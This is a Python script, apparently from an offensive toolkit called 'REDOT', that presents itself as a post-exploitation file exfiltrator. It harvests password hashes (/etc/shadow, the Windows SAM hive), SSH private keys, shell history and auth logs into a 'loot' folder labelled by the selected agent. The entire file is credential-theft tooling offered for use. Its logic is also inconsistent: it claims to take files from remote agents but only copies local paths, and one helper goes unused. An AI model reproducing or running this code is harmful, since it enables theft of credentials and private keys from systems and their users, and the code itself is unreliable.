#!/usr/bin/env python3
# post_exfiltrator.py — REDOT File Exfiltration & Artifact Harvester

import os
import shutil
import socket
import json
import time
from datetime import datetime

EXFIL_DIR = "loot/post"
AGENTS_FILE = "recon/agent_inventory.json"
TARGET_PATHS = [
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "~/.bash_history",
    "/var/log/auth.log",
    "/Users/Shared",
    "C:\\Users\\Public",
    "C:\\Windows\\System32\\config\\SAM",
]

os.makedirs(EXFIL_DIR, exist_ok=True)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def load_agents():
    try:
        with open(AGENTS_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def exfil_file(agent, path):
    expanded = os.path.expanduser(path)
    if not os.path.exists(expanded):
        return f"[x] Not found: {expanded}"
    try:
        filename = os.path.basename(expanded).replace("/", "_").replace("\\", "_")
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        dest = os.path.join(EXFIL_DIR, f"{agent['name']}_{filename}_{timestamp}")
        if os.path.isfile(expanded):
            shutil.copy(expanded, dest)
        elif os.path.isdir(expanded):
            shutil.make_archive(dest, 'zip', expanded)
            dest += ".zip"
        return f"[+] Exfiltrated: {expanded} -> {dest}"
    except Exception as e:
        return f"[!] Error exfiltrating {path}: {e}"

def full_disk_harvest(agent):
    results = []
    for path in TARGET_PATHS:
        results.append(exfil_file(agent, path))
    return results

def main():
    print("=== REDOT Post-Exfiltrator ===")
    agents = load_agents()
    if not agents:
        print("[-] No agents found.")
        return

    print("\nAvailable Agents:")
    for idx, agent in enumerate(agents):
        print(f"{idx+1}. {agent['name']} @ {agent['ip']}")

    try:
        choice = int(input("Select agent by number: ")) - 1
        agent = agents[choice]
    except:
        print("Invalid selection.")
        return

    print("\nSelect mode:")
    print("1. Exfil standard target paths")
    print("2. Exfil specific file/folder")
    mode = input("Enter 1 or 2: ").strip()

    if mode == "1":
        results = full_disk_harvest(agent)
        for line in results:
            print(line)
    elif mode == "2":
        path = input("Enter full path to file or folder to exfiltrate: ").strip()
        print(exfil_file(agent, path))
    else:
        print("Invalid option.")

if __name__ == "__main__":
    main()
